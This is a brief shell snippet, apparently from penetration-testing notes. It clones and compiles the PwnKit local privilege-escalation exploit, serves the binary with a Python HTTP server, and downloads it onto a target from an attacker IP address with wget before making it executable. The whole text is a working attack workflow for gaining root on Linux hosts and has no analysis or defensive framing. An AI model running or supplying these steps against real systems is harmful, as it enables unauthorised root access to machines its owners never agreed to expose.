
```
git clone https://github.com/ly4k/PwnKit.git
cd PwnKit
gcc -shared PwnKit.c -o exploit -Wl,-e,entry -fPIC

python3 -m http.server 80
wget http://192.168.45.173/exploit
chmod +x exploit
```